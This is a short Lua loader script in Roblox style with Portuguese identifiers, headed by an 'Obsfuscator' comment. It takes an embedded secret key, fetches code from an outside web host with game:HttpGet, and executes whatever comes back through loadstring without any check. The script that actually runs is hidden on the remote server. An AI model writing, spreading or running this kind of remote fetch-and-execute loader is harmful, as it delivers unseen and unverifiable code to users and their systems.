-- NovoaprendizObsfuscator
local LINK_API = "https://lua-sparkle-loader.lovable.app/api/public/script?key="
local ID_SECRETO = "LIG4yVlGB1uk2uWUo5h6hnnNmVb3JsRI"

local sucesso, codigoRetornado = pcall(function()
    return game:HttpGet(LINK_API .. ID_SECRETO)
end)

if sucesso and codigoRetornado then
    local executar = loadstring(codigoRetornado)
    if executar then
        executar()
    else
        warn("[Erro] Falha ao compilar os dados do servidor.")
    end
else
    warn("[Erro] Servidor fora do ar ou sem conexao.")
end
